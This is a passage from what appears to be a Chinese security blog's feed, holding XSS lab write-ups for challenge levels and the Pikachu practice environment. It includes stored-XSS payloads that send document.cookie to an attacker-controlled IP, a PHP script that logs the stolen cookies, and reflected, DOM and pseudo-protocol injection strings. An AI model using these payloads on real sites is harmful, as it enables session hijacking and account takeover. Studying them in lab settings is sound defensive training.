-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">arg01</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02="</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>script被过滤、大写转小写、&lt;&gt;被html编码、而鼠标事件、键盘事件没有限制。</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?arg01</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">a&amp;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">arg02\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=666</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> onmousemove</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'alert(1)'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h2>level18</h2>
-<p>和17一样的</p>
-<p>​​</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-02-15T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">XSS跨站脚本攻击实验手册</title>
-    <id>https://min168.top/perm/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%E6%89%8B%E5%86%8C.html</id>
-    <link href="https://min168.top/perm/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%E6%89%8B%E5%86%8C.html"/>
-    <updated>2026-07-26T07:49:45.000Z</updated>
-    <summary type="html"><![CDATA[
-<h2>通过存储型XSS获取被攻击者的cookie</h2>
-<ol>
-<li>
-<p>首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​​</p>
-</li>
-<li>
-<p>在web server 端构造如下payload</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload1（不进行编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'&lt;img src="http://47.113.187.x:91/cookie.php?cookie='</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">+document.cookie+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'" width=0 height=0 border=0 /&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload2（base64编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'&lt;img src="http://192.168.43.18/xssGetCookie/getcookie.php?cookie='</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">+window.btoa(unescape(encodeURIComponent(escape(document.cookie))))+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'"&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>payload提交后<span data-type="text" style="color: var(--b3-font-color9);">javascript脚本操纵DOM对象写入img标签</span>，并且标签的url中拼接了用户的cookie值，当浏览器渲染页面时就会<span data-type="text" style="color: var(--b3-font-color9);">GET形式</span>请求图片资源，并将<span data-type="text" style="color: var(--b3-font-color9);">cookie值</span>携带到攻击者服务器。</p>
-<p>​​</p>
-</li>
-<li>
-<p>在攻击者服务器需要提供和payload路径对应的url给请求端访问，攻击者服务器获取GET中的cookie存储到文本文件中。</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;?php //攻击端，用于接收被攻击端请求的信息</span></span>
-<span class="line"><span>$cookie = $_GET['cookie']; //获取cookie信息</span></span>
-<span class="line"><span>$log =  fopen('cookie.txt','a'); //生成获取的cookie信息，打开文件，a是追加写模式</span></span>
-<span class="line"><span>fwrite($log,$cookie.PHP_EOL); //fwrite写入</span></span>
-<span class="line"><span>fclose($log);</span></span>
-<span class="line"><span>?&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>查看文本文件，两个payload所请求的cookie。​</p>
-<p>​</p>
-<p>经过编码的cookie经过base64和URL解码如下</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ichunqiu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">PHPSESSID</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1iadqpfqbcrjqjfamfdmjchn2t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">_ga_P1JF3QTQ79</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">GS1.1.1726128058.2.0.1726128058.0.0.0</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>当其他用户访问该网页</p>
-<p>攻击者端生成如下cookie</p>
-<p>​​</p>
-</li>
-<li>
-<p>编码的cookie经过base64和URL解码如下</p>
-<p>PHPSESSID=8mf3m5s9h457dlnqfjdmdi5st8</p>
-</li>
-<li>
-<p>利用该cookie可以通过工具实现不用账号密码登录他人账户。</p>
-</li>
-</ol>]]></summary>
-    <content type="html"><![CDATA[
-<h2>通过存储型XSS获取被攻击者的cookie</h2>
-<ol>
-<li>
-<p>首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​​</p>
-</li>
-<li>
-<p>在web server 端构造如下payload</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload1（不进行编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'&lt;img src="http://47.113.187.x:91/cookie.php?cookie='</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">+document.cookie+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'" width=0 height=0 border=0 /&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">payload2（base64编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'&lt;img src="http://192.168.43.18/xssGetCookie/getcookie.php?cookie='</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">+window.btoa(unescape(encodeURIComponent(escape(document.cookie))))+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'"&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>payload提交后<span data-type="text" style="color: var(--b3-font-color9);">javascript脚本操纵DOM对象写入img标签</span>，并且标签的url中拼接了用户的cookie值，当浏览器渲染页面时就会<span data-type="text" style="color: var(--b3-font-color9);">GET形式</span>请求图片资源，并将<span data-type="text" style="color: var(--b3-font-color9);">cookie值</span>携带到攻击者服务器。</p>
-<p>​​</p>
-</li>
-<li>
-<p>在攻击者服务器需要提供和payload路径对应的url给请求端访问，攻击者服务器获取GET中的cookie存储到文本文件中。</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;?php //攻击端，用于接收被攻击端请求的信息</span></span>
-<span class="line"><span>$cookie = $_GET['cookie']; //获取cookie信息</span></span>
-<span class="line"><span>$log =  fopen('cookie.txt','a'); //生成获取的cookie信息，打开文件，a是追加写模式</span></span>
-<span class="line"><span>fwrite($log,$cookie.PHP_EOL); //fwrite写入</span></span>
-<span class="line"><span>fclose($log);</span></span>
-<span class="line"><span>?&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>查看文本文件，两个payload所请求的cookie。​</p>
-<p>​</p>
-<p>经过编码的cookie经过base64和URL解码如下</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ichunqiu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">PHPSESSID</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1iadqpfqbcrjqjfamfdmjchn2t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">_ga_P1JF3QTQ79</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">GS1.1.1726128058.2.0.1726128058.0.0.0</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>当其他用户访问该网页</p>
-<p>攻击者端生成如下cookie</p>
-<p>​​</p>
-</li>
-<li>
-<p>编码的cookie经过base64和URL解码如下</p>
-<p>PHPSESSID=8mf3m5s9h457dlnqfjdmdi5st8</p>
-</li>
-<li>
-<p>利用该cookie可以通过工具实现不用账号密码登录他人账户。</p>
-</li>
-</ol>
-<h2>Pikachu的XSS实验</h2>
-<h3>存储型</h3>
-<p>在页面输出cookie即操作DOM获取cookie并展示到页面。</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">document.write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;p&gt;'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;/p&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注意：document.write中需要是输出字符和变量的拼接。</p>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/p&gt;&lt;img </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">src</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"https://www.hacked.com.cn/images/logo.gif"</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> border</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"0"</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  onmouseover</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"javascript:alert('广告位招租')"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/p&gt;&lt;img </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">src</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"https://www.hacked.com.cn/images/logo.gif"</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> border</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"0"</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  onclick</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"javascript:alert('广告位招租')"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/p&gt;&lt;a </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"https://nav3.cn/side?page=6&amp;id=0&amp;_=1726107142616"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">点我导航</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h3>反射型(GET)</h3>
-<p>直接输入<code>&lt;/p&gt;</code>标签被闭合</p>
-<p>​​</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/p&gt;&lt;script&gt;document.write(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;p&gt;'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;/p&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h3>反射型(POST)</h3>
-<p>登录</p>
-<p>​​</p>
-<p>登录发现套路一样</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/p&gt;&lt;script&gt;document.write(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;p&gt;'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'&lt;/p&gt;'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);&lt;/script&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h3>DOM型xss</h3>
-<p>输入111，发现被放到a的href里</p>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#' onclick="alert(document.cookie)"&gt;   闭合href标签，并且在中添加a有的点击事件。</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h3>DOM型xss-x</h3>
-<p>输入内容，发现拼接在URL</p>
-<p>​​</p>
-<p>在a的href里拼接，使其闭合。</p>
-<p>​​</p>
-<p>使用’闭合href，加入onclick事件获取cookie</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">' onclick="alert(document.cookie)"'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h3>xss之href输出</h3>
-<p>​​</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">W3School中对</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;a&gt;标签的href属性有以下描述（引用摘自HTML &lt;a&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">标签的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 属性）：</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL。</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 属性的值可以是任何有效文档的相对或绝对</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> URL，包括</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data-type="text"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> style="color: var(--b3-font-color9);"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">片段标识符</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">和</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data-type="text"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> style="color: var(--b3-font-color9);"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">JavaScript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 代码段</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">。如果用户选择了</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;a&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">标签中的内容，那么浏览器会尝试检索并显示</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 属性指定的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> URL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 所表示的文档，或者执行</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data-type="text"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> style="color: var(--b3-font-color9);"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">JavaScript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 表达式</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">、</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data-type="text"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> style="color: var(--b3-font-color9);"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">方法和函数的列表</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">。</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascript:alert(document.cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<h2>XSS与标签</h2>
-<h3>伪协议</h3>
-<h4>data:</h4>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;iframe src</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"data:text/html,&lt;script&gt;alert('XSS');&lt;/script&gt;"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> " &gt;&lt;iframe&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>javascript:</h4>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascript:alert(document.cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">可用在href里</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>XSS变形</h2>
-<p>实验环境pikachu XSS</p>
-<ol>
-<li>
-<p>大小写</p>
